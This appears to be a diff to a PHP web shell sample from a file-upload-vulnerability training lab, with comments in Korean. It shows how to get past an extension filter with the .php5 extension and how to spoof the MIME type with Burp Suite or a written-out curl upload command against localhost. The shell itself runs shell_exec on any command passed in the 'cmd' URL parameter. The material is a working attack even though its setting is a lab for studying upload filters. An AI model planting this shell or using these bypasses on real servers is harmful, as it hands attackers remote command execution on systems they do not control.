@@ -3,29 +3,23 @@
  * Level 2 우회 샘플 - .php5 확장자 사용
  *
  * 우회 기법:
- * - .php 확장자만 차단하므로 .php5 사용
- * - PHP 5.x 버전에서 사용되던 확장자
+ * 1. .php 확장자 대신 .php5 사용
+ * 2. MIME 타입을 text/plain 등으로 조작
  *
  * 사용법:
  * 1. 확장자를 .txt에서 .php5로 변경
- * 2. Level 2 선택 후 업로드
- * 3. 브라우저에서 접근: http://localhost:8080/uploads/shell.php5?cmd=whoami
+ * 2. Level 2 선택
+ * 3. Burp Suite로 Content-Type을 text/plain으로 변경하거나
+ *    curl로 업로드: curl -F "level=2" -F "file=@shell.php5;type=text/plain" http://localhost:8080/upload.php
+ * 4. 브라우저에서 접근: http://localhost:8080/uploads/shell.php5?cmd=whoami
  */
 
 if (isset($_GET['cmd'])) {
     echo "<pre>";
-    // passthru는 차단 리스트에 있으므로 다른 함수 사용
-    shell_exec($_GET['cmd']);  // 아, 이것도 차단됨!
-    // 그렇다면 백틱 사용
-    echo `{$_GET['cmd']}`;
+    echo shell_exec($_GET['cmd']);
     echo "</pre>";
 } else {
-    ?>
-    <h3>Level 2 Bypass - .php5 Extension</h3>
-    <form>
-        <input type="text" name="cmd" placeholder="command" />
-        <button>Execute</button>
-    </form>
-    <?php
+    echo "<h3>Web Shell - .php5 Extension Bypass</h3>";
+    echo "<p>Usage: ?cmd=ls</p>";
 }
 ?>
